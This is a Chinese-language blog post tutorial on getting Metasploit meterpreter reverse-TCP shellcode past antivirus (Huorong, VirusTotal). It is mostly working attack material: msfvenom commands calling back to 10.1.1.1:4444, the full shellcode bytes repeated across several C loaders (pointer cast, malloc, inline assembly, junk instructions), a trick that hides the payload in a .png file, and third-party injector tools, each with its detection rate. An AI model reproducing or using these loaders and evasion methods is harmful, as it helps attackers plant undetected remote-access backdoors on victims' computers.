---
layout:  post    # 使用的布局（不需要改）
title:   c语言shellcode免杀   # 标题 
subtitle:    #副标题
date:  2021-01-27  # 时间
author:  yanmie    # 作者
header-img: img/.jpg ##标签这篇文章标题背景图片
catalog: true      # 是否归档
tags:        
    - 免杀

---

# C语言shellcode 免杀

## 一、shellcode执行

我们这里使用vs2019进行编译，用火绒当作杀软。

首先利用msfvenom 生成c 的shellcode,

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4444 -f c>shellcode.c
```

#### 1.0 前置操作

打开vs2019 , 创建新项目

![image-20210119184945033](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119184945033.png)

选择空项目，下一步，输入名称选择目录创建即可。

![image-20210119185042865](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119185042865.png)

右键源文件，添加新建项

![image-20210119185154847](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119185154847.png)

选择 .cpp 文件，添加即可

![image-20210119185247250](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119185247250.png)

后续设置，右键项目，最下边点属性，



![image-20210119184726167](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119184726167.png)

选择 C/C++ ---->  代码生成  --->  运行库   --->   多线程调试(/MTd),**默认的会执行不了。**

![image-20210119185407479](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119185407479.png)

前置环境工作完成了，接着写代码吧。

#### 1.1 指针执行~VT查杀22/67

```c
#include <stdio.h>

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x01\x01\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


void main()

{

	((void(*)(void)) & buf)();

}
```

保存之后，生成重新解决方案，就会生成 exe 文件。



![image-20210119173049284](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119173049284.png)

编译生成，这里火绒直接报毒，`文件实时检测，进程行为监测` 。也就是说静态查杀没反应。

运行直接上线，

![image-20210119191031064](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119191031064.png)

但是运行 exe 之后会弹出一个黑框，而且点叉号，那么就意味着结束软件运行，会话也就关闭，所以需要在 c 代码里添加

```c
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 
```

作用即是使 windwos 控制台程序运行时不出现这个黑框。

![image-20210119191104274](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119191104274.png)

完整代码：

```
#include <stdio.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x01\x01\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


void main()

{

	((void(*)(void)) & buf)();

}
```

重新生成，运行即不出现黑框，后台直接运行。

丢到 VT 上看一看（www.virustotal.com），查杀率 22/67

![image-20210119173514813](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119173514813.png)

#### 1.2 动态申请内存~VT查杀23/70

```c
#include <stdio.h>
#include<stdlib.h>
#include<windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x01\x01\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


void main()

{
	char *p=NULL;
	p = (char *)malloc(sizeof(buf));
	memcpy(p,buf, sizeof(buf));
	((void(*)())p)();

}
```

和直接指针执行差不多，也是过了静态查杀，但是逃不过沙盒检测。

测试成功上线，

VT查杀率 23/70

![image-20210119182023479](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119182023479.png)

#### 1.3 强制类型转换~VT查杀22/69

```c
#include <stdio.h>
#include<stdlib.h>
#include<windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x01\x01\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


void main()
{
	((void(WINAPI*)(void)) & buf)();
}
```

和前面情况差不多，逃不过火绒沙盒检测。

VT查杀率

![image-20210119182733734](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119182733734.png)

#### 1.4 嵌入式汇编~VT查杀21/70

```c
#include <stdio.h>
#include<windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x01\x01\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


void main()
{
	_asm
	{
		mov eax,offset buf
		jmp eax
	}
}
```

测试可以成功上线，但是还是逃不过火绒行文沙盒检测。

VT查杀率  21/70

![image-20210119192538948](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119192538948.png)

#### 1.5 伪指令~VT查杀23/70

也就是花指令，添加一堆没用的指令，

```c
#include <stdio.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x01\x01\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


void main()
{
	_asm
	{
		mov eax,offset buf
		_emit 0xFF
		_emit 0xE0
	}
}
```

测试可成功上线，但是依旧逃不过火绒行为沙盒检测。

VT查杀率 23/70

![image-20210119193324554](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119193324554.png)

#### 1.6 xor加密

需要用到 github 上一个小工具。

```
git clone https://github.com/Arno0x/ShellcodeWrapper ShellcodeWrapper

cd ShellcodeWrapper

pip2 install -r requirements.txt
```

安装 python2 库时出现错误，下载

```
https://download.microsoft.com/download/7/9/6/796EF2E4-801B-4FC4-AB28-B59FBF6D907B/VCForPython27.msi
```

安装完成，

```
    pip uninstall pycrypto  
    pip install setuptools  #安装时有依赖关系，最好加上，反正没错
    pip install pycrypto
```

即可成功安装

环境还是有问题，再kali里搞吧。

msf 生成 二进制格式的 shellcode

```c
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4444 -f raw > shellcode.raw
```

执行

```
python2 shellcode_encoder.py -cpp -cs -py shellcode.raw thisismykey xor
```

`thisismykey` 是自己设置的。

#### 1.7 分离免杀~过火绒

分离原理呢就跟名字一样，把payload分离。

比如我们把 shellcode 放到一个文本文件或者其他不可执行文件里，然后我们的之后后门Exe的时候从文件读取 shellcode ，就是分离免杀了，效果非常好，因为杀软一般是不会对不可执行文件进行杀毒的。

开始操作：

msf生成 shellcode:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4444 -f raw>shell.png
```

把shellcode输入进一张图片里。

然后利用 c  语言读取 png 图片内容，进行加载 shellcode

```c
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#pragma warning(disable : 4996)
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

void main()
{
	FILE* fp;
	int size;
	unsigned char* buf;
	fp = fopen("shell.png","rb");
	fseek(fp,0, SEEK_END);
	size = ftell(fp);
	//printf("%d",size);
	buf = (unsigned char*)malloc(size);

	fread(buf, size, 1, fp);
	
	((void(*)())buf)();
}
```

测试可成功上线，并且火绒无反应。

![image-20210119220854128](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119220854128.png)

VT对 exe查杀率 18/68

![image-20210119220639692](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119220639692.png)

VT对 shell.png 查杀率 14/58

![image-20210119220744669](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119220744669.png)

但是呢，这里有个条件，必须得把 `shell.png` 放置在代码中加载对应的位置，上述代码在所在目录，所以得把 `shell.exe` 和 `shell.png` 放在同一级目录，才能成功。

## 二、使用加载器

#### 2.1 shellcode_launcher

https://github.com/clinicallyinane/shellcode_launcher/

加载器本身就直接被火绒查杀了。

![image-20210119202757883](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119202757883.png)

生成 msf shellcode

```
 msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=10.1.1.1 lport=4444  -f raw -o shellcode.raw
```

加载器加载执行

```
shellcode_launcher.exe -i shellcode.raw
```

可成功上线，但是这个加载器本身就被杀了。

![image-20210119204631563](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119204631563.png)

#### 2.2 十六进制方式执行 shellcode~VT查杀9/68

https://github.com/DimopoulosElias/SimpleShellcodeInjector

这里本身就有作者生成的 `ssi.exe` ，但是已经被杀了，所以需要我们自己拿作者的c源码，生成exe.

```
git clone https://github.com/DimopoulosElias/SimpleShellcodeInjector

cd DimopoulosElias

i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe

```

或者直接在 vs2019生成 exe 

msf 生成 shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4444 -f c -o msf.txt

# 然后
cat msf.txt|grep -v unsigned|sed "s/\"\\\x//g"|sed "s/\\\x//g"|sed "s/\"//g"|sed ':a;N;$!ba;s/\n//g'|sed "s/;//g"
```

得到一串十六进制代码

```
fce88f0000006089e531d2648b52308b520c8b521431ff8b72280fb74a2631c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b48188b58205001d385c9743c31ff498b348b01d631c0c1cf0dac01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a680a010101680200115c89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740aff4e0875ece8670000006a006a0456576802d9c85fffd583f8007e368b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd583f8007d285868004000006a0050680b2f0f30ffd55768756e4d61ffd55e5eff0c240f8570ffffffe99bffffff01c329c675c1c3bbf0b5a2566a0053ffd5
```

![image-20210119211538972](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119211538972.png)

火绒无反应，成功绕过火绒，

VT查杀率 9/68

![image-20210119211818255](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210119211818255.png)





参考文章：

https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html

https://www.freebuf.com/articles/system/227463.html